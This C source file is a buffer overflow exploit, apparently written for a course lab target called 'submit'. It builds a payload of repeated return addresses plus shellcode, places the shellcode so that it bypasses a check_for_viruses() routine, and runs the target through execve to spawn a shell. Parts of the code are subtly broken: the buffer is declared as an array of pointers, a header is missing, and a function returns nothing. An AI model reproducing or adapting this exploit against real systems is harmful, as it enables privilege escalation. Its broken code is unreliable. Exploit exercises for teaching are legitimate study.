/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </share/shellcode.h>

#define TARGET "/usr/local/bin/submit"

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE            1024
#define NOP                            0x90

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(void)
{
  char *args[4];

  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  char *buff[bsize], *ptr;
  long *addr_ptr;
  int i;
  long *addr = (long*)  0xffbfde0c; // Address of where shellcode starts
  FILE *payload_file;
  
  printf("Using address: 0x%x\n", addr);
  addr_ptr = (long *) buff;

  //Fill buff with address
  //Addition addrs to overflow buffer
  for (i = 0; i < bsize + 64; i+=4)
    *(addr_ptr++) = (long) addr;

  //Add shellcode to buffer with offset of 245
  //This is to place '/bin/sh' right at the edge of the 1024 
  // to bypass check_for_viruses()
  ptr = buff + 245;
  for (i = 0; i < strlen(shellcode); i++){
    *(ptr++) = shellcode[i];
  }
  buff[bsize - 1] = '\0';

  if ((payload_file = fopen("shellcode", "w+")) == NULL) {
    puts("Cannot open 'shellcode'");
    return -1;
  }

  //Show me the buffer!
  printf("buff: %s\n", buff);

  fprintf(payload_file, "%s", buff);
  fclose(payload_file);

  // another way
  args[0] = TARGET;
  args[1] = "shellcode";
  args[2] = "wargble";
  args[3] = NULL;

  //Run submit
  return execve(args[0], args, NULL);
}


